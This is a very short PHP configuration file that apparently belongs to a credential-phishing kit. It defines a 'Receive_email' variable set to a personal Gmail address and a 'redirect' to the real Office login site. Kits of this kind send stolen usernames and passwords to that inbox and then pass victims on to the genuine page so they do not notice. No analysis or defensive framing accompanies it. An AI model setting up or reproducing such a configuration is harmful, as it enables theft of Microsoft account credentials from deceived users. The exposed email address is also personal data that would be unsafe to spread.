<?php 
$Receive_email="samanthanemeth0147@gmail.com";
$redirect="https://www.office.com/";
?>